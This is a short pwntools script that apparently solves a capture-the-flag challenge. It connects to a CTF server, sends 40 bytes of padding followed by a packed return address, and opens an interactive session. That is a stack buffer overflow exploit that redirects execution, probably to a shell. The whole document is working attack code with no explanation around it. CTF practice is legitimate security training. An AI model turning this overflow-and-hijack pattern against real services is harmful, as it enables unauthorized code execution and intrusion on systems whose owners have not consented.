from pwn import *

r = remote("csie.ctf.tw",10120)

r.sendline("A"*40+p64(0x0400566))

r.interactive()
